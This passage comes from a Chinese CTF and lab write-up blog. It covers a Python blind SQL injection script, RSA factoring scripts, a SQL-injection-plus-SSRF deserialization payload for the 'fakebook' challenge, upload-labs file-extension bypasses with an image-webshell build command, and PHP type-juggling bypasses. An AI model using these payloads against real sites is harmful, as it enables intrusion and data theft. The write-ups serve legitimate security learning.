[ord(i) for i in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz!_@-&#125;&#123;']#将字母转换为ascii码 a = '0x5e' # '\\'的ascii码值 while(1): for j in string: if (hex(j)[2:]=='7b'): str='5c'+hex(j)[2:] #将'&#123;'转义， else: str=hex(j)[2:] time.sleep(0.1) payload =\"||/**/(select/**/password/**/from/**/users/**/limit/**/9,1)/**/regexp/**/binary/**/%s/**/#\" % (a + str) # 盲注的查询语句 regexp binary 是区分大小写的正则匹配 data =&#123;\"username\":\"\\\\\",\"password\":payload&#125; print(data) r = requests.post(url,data=data) #访问 if \"success\" in r.text: #print(r.text) password+=chr(j) print(password) a+=str break if \"wrong\" in r.text: break print(password) Crypto幼儿园的密码题先转换为十进制后在线分解后直接上脚本 http://www.factordb.com/ 在线分解网址 import binascii import sys sys.setrecursionlimit(1000000) def ByteToHex(bins): return ''.join([\"%02X\" % x for x in bins]).strip() def n2s(num): t = hex(num)[2:-1] # python if len(t) % 2 == 1: t = '0' + t \\#print(t) return(binascii.a2b_hex(t).decode('latin1')) def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y) def modinv(a, m): g, x, y = egcd(a, m) if g != 1: print('modular inverse does not exist') return 'null' else: return x % m c = 40448992051548719008529549070468060415257485938698092782029814901918646701101 p = 328413456989577256301798468872388310877 q = 324350545929838254331191385863847627003 e = 65537 n = p * q d = modinv(e, (p - 1) * (q - 1)) m = pow(c, d, n) print (m) 数字转字符的脚本 import binascii def n2s(num): t = hex(num)[2:-1] # python if len(t) % 2 == 1: t = '0' + t \\#print(t) return(binascii.a2b_hex(t).decode('latin1')) print(n2s(a)) #a为上一个脚本计算出的数字 小学生的密码题初中生的密码题次题与幼儿园的类似，但是由于n过大，试了很多工具都无法分解。 仔细看题会发现这题的条件给的比较多,知道p-q 于是想到了(p+q)^2-(p-q)^2=4pq=4n，可以算出p+q,之后解出p,q 算p,q的脚本 # -*- coding = utf - 8 -*- #@Time : 2020/9/24 21:55 #@Author : sunzy #@File : su.py import gmpy2 n = 848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397 p_sub_q = -3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636 x = (4*n+p_sub_q*p_sub_q) gmpy2.mpz(x) #p_add_q = gmpy2.iroot(x, 2) p_add_q = 58342634998122692674032973234620896020471694068399847453520741898744437026570834277134765347908181270295928479896424327076716339778780713227054670754114006755614107059128760453507315091935855120450792252194791430498450216725579392051311373554303029775579999984765816108626868293630358812164765119470747267373609041885833415440716244492402495944064255436477147868576748300862501670473856373437423326957856588782039066794320093570665076624361151742737113922376038763268964187459938086360191752544167623804772397201519904950840301831333585995087985697059748872751988663760065650743406672809203915981347563824970092886078 # print(p_add_q) y=(p_sub_q+p_add_q) z=(p_add_q-p_sub_q) print(y&gt;&gt;1) print(z&gt;&gt;1) 知道p,q后，此题的解法与幼儿园的解法相同 菜鸡只会这么多。。。","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"文件包含","slug":"文件包含","permalink":"https://sunzhengyu99.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"rsa","slug":"rsa","permalink":"https://sunzhengyu99.github.io/tags/rsa/"}]},{"title":"fakebook","date":"2020-09-27T11:17:01.000Z","path":"2020/09/27/fakebook/","text":"攻防世界-fakebook感觉挺有意思的一道题，所以记录一下吧 0x01发现注入点进入网页发现是一个博客页面，先随便注册一个账号登录上去看看，发现了一个貌似可以注入的地方 http://220.249.52.133:44224/view.php?no=1参数no这里应该是一个数字型的注入点，测试一下。 http://220.249.52.133:44224/view.php?no=1 and 1=1显示是正常的，但是 http://220.249.52.133:44224/view.php?no=1 and 1=2网页报错，确定了就是数字型注入 接下来继续注入的常规操作。 http://220.249.52.133:44224/view.php?no=-2 order by 4#时页面显示正常，并提示了网站的根目录 但是当 order by 5 # 时，网页报错，确定是四列。 爆表名 本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测 试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示 Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31 提示存在反序列化，但是不知道怎么用继续爆表。 ?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4# ?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;# 爆出一大堆列名。直接读取data的内容 no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS ?no=-2 union/**/select 1,(select data from users),3,4 # 发现内容是注册时信息保存为序列化内容 O:8:”UserInfo”:3:{s:4:”name”;s:5:”sunzy”;s:3:”age”;i:22;s:4:”blog”;s:12:”22.github.io”;} 到这里就不知道怎么办了。。。 0x02审计源码扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径 源码 &lt;?php class UserInfo //user信息类 &#123; public $name = \"\"; public $age = 0; public $blog = \"\"; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) // 处理url &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog); &#125; &#125; 审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。 思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。 ?no=-2%20union/**/select%201,2,3,'O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:5:\"sunzy\";s:3:\"age\";i:22;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";&#125;'%20# 查看源码，解base64。","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"unserailize","slug":"unserailize","permalink":"https://sunzhengyu99.github.io/tags/unserailize/"}]},{"title":"upload-11-21","date":"2020-09-18T13:58:51.000Z","path":"2020/09/18/upload2/","text":"upload-labs 11-21 pass11$is_upload = false; $msg = null; if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\",\"ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125; &#125; $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 这段代码是将文件名中出现 deny_ext的后缀名替换为空 可以双写绕过，即1.pphphp pass12$is_upload = false; $msg = null; if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125; &#125; 本题与之前的题目有所不同，这题的文件的保存路径是可以控制的 这里用的%00截断，原理如下 www.xxx.com/qq.jpg www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php其后缀名为.jpg可以绕过检测，但是windows系统处理时不会处理%00之后的内容故保存的文件就是qq.php pass13这题与上题利用的原理相同 但是这里要使用 00的二进制形式 pass14明确说了上传图片木马 function getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType; &#125; GIF89a 是GIF图片的文件头 ，是为了绕过gif文件的检查 图片木马的制作 桌面建立一个文本文件将其改为2.jpg，再建立一个改为1.php,其内容为你想添加的一句话木马 copy 2.jpg /b + 1.php /a webshell.jpg 未完待续。。。","tags":[{"name":"双写绕过","slug":"双写绕过","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87/"},{"name":"00截断","slug":"00截断","permalink":"https://sunzhengyu99.github.io/tags/00%E6%88%AA%E6%96%AD/"}]},{"title":"uploads-labs","date":"2020-09-16T13:48:48.000Z","path":"2020/09/16/uploads/","text":"upload-labs 1-10 pass1直接抓包修改文件后缀名为jpg,png,gif即可 pass2查看源码 if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) 这段代码说明是对文件的MIME类型进行了过滤，直接上传 1.php 抓包后修改文件类型为 &#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;,这三个类型都为图片 抓包修改MIME即可 知识点补充： MIME类型对大小写不敏感，但是传统写法都是小写。 text/plain text/html image/jpeg image/png audio/mpeg audio/ogg audio/* video/mp4 application/* application/json application/javascript application/ecmascript application/octet-stream 更详细的解释， pass3$deny_ext = array('.asp','.aspx','.php','.jsp'); 只禁止了.asp,.aspx,.php,.jsp后缀文件，可以使用php3,php5,php7,phtml等等后缀名绕过 pass4.htaccess文件的作用 URL重写、自定义错误页面 MIME类型配置 访问权限控制等 主要体现在伪静态的应用 图片防盗链 自定义404错误页面 阻止/允许特定IP/IP段 目录浏览与主页 禁止访问指定文件类型 文件密码保护 &lt;FilesMatch \"1.jpg\"&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 这几句代码的意思： 通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件， 无论扩展名是什么(没有也行)，都以php的方式来解析 上传完.htaccess文件后直接上传一个 1.jpg即可 pass5$is_upload = false; $msg = null; if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125; &#125; 本题与第十题完全一样，详细解答见第十题 pass6$is_upload = false; $msg = null; if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125; &#125; 仔细查看源码会发现少了下面的这段代码 $file_ext = strtolower($file_ext); //转换为小写 这里就可以大小写绕过。将文件后缀名改为.pHp , .PHP等 pass7$is_upload = false; $msg = null; if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125; &#125; 跟第六关对比发现少了这句话 $file_ext = trim($file_ext); //首尾去空 利用Windows系统的文件名特性。文件名最后增加空格和点，写成1.php .，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个.会被去掉，实际上保存的文件名就是1.php pass8$is_upload = false; $msg = null; if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125; &#125; 这段代码少了这句话，可以与第六关相同的做法 $file_name = deldot($file_name);//删除文件名末尾的点 pass9$is_upload = false; $msg = null; if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125; &#125; 仔细观察发现少了这段代码 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA 采用Windows文件流特性绕过 将文件名改为 1.php::$DATA,但是实质上保存的文件还是1.php pass10$is_upload = false; $msg = null; if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125; &#125; 这一句代码是用来检测末尾是否是.，可以双写绕过。抓包将文件名改为1.php. . （注意两点之间有空格） 前面去掉.然后检验.不存在，再去空格，留下php.，然后php.不属于$deny_ext数组中存在的，当然就直接提交了。因为windows自动去点，于是php后缀就出来了","tags":[{"name":"MIME","slug":"MIME","permalink":"https://sunzhengyu99.github.io/tags/MIME/"},{"name":"大小写绕过","slug":"大小写绕过","permalink":"https://sunzhengyu99.github.io/tags/%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/"},{"name":".htaccess","slug":"htaccess","permalink":"https://sunzhengyu99.github.io/tags/htaccess/"},{"name":"windows文件特性","slug":"windows文件特性","permalink":"https://sunzhengyu99.github.io/tags/windows%E6%96%87%E4%BB%B6%E7%89%B9%E6%80%A7/"}]},{"title":"bugku代码审计","date":"2020-09-14T13:01:01.000Z","path":"2020/09/14/decode/","text":"简单的代码审计 extract变量覆盖&lt;?php $flag='xxx'; //新建变量 extract($_GET); // 变量覆盖 if(isset($shiyan)) //判断是否存在 &#123; $content=trim(file_get_contents($flag));//把文件读入字符串 if($shiyan==$content) //判断两变量是否相等 &#123; echo'flag&#123;xxx&#125;'; &#125; else &#123; echo'Oh.no'; &#125; &#125; ?&gt; extract()函数 isset()函数isset() 函数用于检测变量是否已设置并且非 NULL。 如果已经使用 unset() 释放了一个变量之后，再通过 isset() 判断将返回 FALSE。 若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。 同时要注意的是 null 字符（”\\0”）并不等同于 PHP 的 NULL 常量。 Tips:isset()函数如果一次传入多个参数，只有参数全被设置且非空的情况下才返回TRUE，isset()函数对数组中的元素同样适用。 file_get_contents() 变量覆盖的意思就是让自己上传的变量值覆盖原有的变量值 这里值得注意的是 $shiyan==$content,而content的值来自于函数自己建的$flag变量，所以这题目的变量覆盖实际是覆盖$flag的值，让flag的值和shiyan的值相同 可以用空值的方法使二者想等即 ?shiyan=&amp;flag= strcmp比较字符串http://123.206.87.240:9009/6.php &lt;?php $flag = \"flag&#123;xxxxx&#125;\"; if (isset($_GET['a'])) &#123; if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 //比较两个字符串（区分大小写） die('Flag: '.$flag); else print 'No'; &#125; ?&gt; 题目给的注释很清楚的给出了获得flag的条件。。。 先了解一下 strcmp()的两个参数都必须是字符串类型的，但是如果传递一个非字符穿类型的参数进去，例如数组，则函数就会报错，其返回值就为0。满足 if (strcmp($_GET[&#39;a&#39;], $flag) == 0) 即可获得flag url:http://123.206.87.240:9009/6.php?a[]= urldecode二次编码绕过题目说的很清楚了，二次编码绕过 if(eregi(\"hackerDJ\",$_GET[id])) &#123; echo(\" not allowed! \"); PHP 函数 eregi() 语法 int eregi(string pattern, string string, [array regs]); 定义和用法 eregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写。Eregi()可以特别有用的检查有效性字符串,如密码。 可选的输入参数规则包含一个数组的所有匹配表达式,他们被正则表达式的括号分组。 返回值 如果匹配成功返回true,否则,则返回false 这里进行了过滤，传的值不能为hackerDJ $_GET[id] = urldecode($_GET[id]); if($_GET[id] == \"hackerDJ\") //要编码的字符串hackerDJ GET会提交时进行一次urlencode urldecode()于urlencode()是一对想反作用的函数，一个解码一个编码。 $_GET[id] = urldecode($_GET[id]) urldecode后的$_GET[id] 复制给自己等于hackerDJ 所以对hackerDJ 进行两次urlencode, 为了绕过过滤；进行一次urldecode后其值和hackerDJ相等，得到flag ?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41 md5()函数&lt;?php error_reporting(0); $flag = 'flag&#123;test&#125;'; if (isset($_GET['username']) and isset($_GET['password'])) &#123; if ($_GET['username'] == $_GET['password']) print 'Your password can not be your username.'; else if (md5($_GET['username']) === md5($_GET['password'])) die('Flag: '.$flag); else print 'Invalid password'; &#125; ?&gt; 利用md5不能处理数组的特性绕过 md5() md5函数遇到数组类型的参数时，返回值为null，null===null,所以满足md5($_GET[&#39;username&#39;]) === md5($_GET[&#39;password&#39;] GET: /?username[]=1&amp;password[]=2 数组返回NULL绕过&lt;?php $flag = \"flag\"; if (isset ($_GET['password'])) &#123; if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) //进行过滤，password必须包含字母和数字 echo 'You password must be alphanumeric'; else if (strpos ($_GET['password'], '--') !== FALSE) die('Flag: ' . $flag); else echo 'Invalid password'; &#125; ?&gt; 提示是数组返回NULL 直接尝试提交?password[]=，flag就出来了 了解一下原理， 代码相关知识点链接如下： isset函数：http://php.net/manual/zh/function.isset.php ereg函数：http://www.php.net/manual/zh/function.ereg.php strpos函数：http://www.w3school.com.cn/php/func_string_strpos.asp “[A-Za-z0-9]”方括号表示字符集，[A-Za-z0-9]匹配大小写字母和数字其中一个字符 “^[A-Za-z0-9]$”^表示字符串开始，$表示字符串结束 ，这个匹配只有一个大小写字母和数字字符的字符串 “^[A-Za-z0-9]+$”+号表示重复1到多次，匹配由多个数字大小字母组成的字符串 值得注意的是这两个函数能处理的参数都是string类型 ereg只能处理字符，r如果数组，则返回的是null，三个等号的时候不会进行类型转换。所以null不等于false。 strpos的参数同样不能够是数组，所以返回的依旧是null，null不等于false也是正确。 故?password[]=可以绕过。 但是还有一种为%00截断 ?password=d%00-- 弱类型整数大小比较绕过$temp = $_GET['password']; is_numeric($temp)?die(\"no numeric\"):NULL; if($temp&gt;1336)&#123; echo $flag; 题目说了弱类型比较绕过 payload： password=1444b 首先在is_numeric()检查时，因为1444b中包含了字母b所以不会认为是数字类型 在判断是否大于1336时，php默认1444b是数字类型，所以大于1336 sha()函数比较绕过&lt;?php $flag = \"flag\"; if (isset($_GET['name']) and isset($_GET['password'])) &#123; var_dump($_GET['name']); echo \"\"; var_dump($_GET['password']); var_dump(sha1($_GET['name'])); var_dump(sha1($_GET['password'])); if ($_GET['name'] == $_GET['password']) echo 'Your password can not be your name!'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('Flag: '.$flag); else echo 'Invalid password.'; &#125; else echo 'Login first!'; ?&gt; 代码逻辑很简单，首先判断是否get方式传递name和password参数 var_dump，输出参数类型和值 之后如果通过if判断则可以拿到flag if判断的条件 name和password不能相同 但是sha1(name)===sha1(password) 这里可以使用sha1函数无法处理数组的漏洞绕过，sha1遇到参数为数组类型时返回值为0 payload： GET: ?name[]=1&amp;password[]=2 md5加密相等绕过&lt;?php $md51 = md5('QNKCDZO'); $a = @$_GET['a']; $md52 = @md5($a); if(isset($a))&#123; if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123; echo \"flag&#123;*&#125;\"; &#125; else &#123; echo \"false!!!\"; &#125; &#125; else &#123; echo \"please input a\"; &#125; ?&gt; 即使用get方式传递一个参数a,使得a的值不等于QNKCDZO但是二者的md5值相同 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 常见的payload有 QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a //下面是sha1()加密后 ==相等的字符串 sha1(str) sha1('aaroZmOk') sha1('aaK1STfY') sha1('aaO8zKZF') sha1('aa3OFF9m') payload: GET: ?a=240610708 十六进制与数字比较&lt;?php error_reporting(0); function noother_says_correct($temp) &#123; $flag = 'flag&#123;test&#125;'; $one = ord('1'); //ord — 返回字符的 ASCII 码值 $nine = 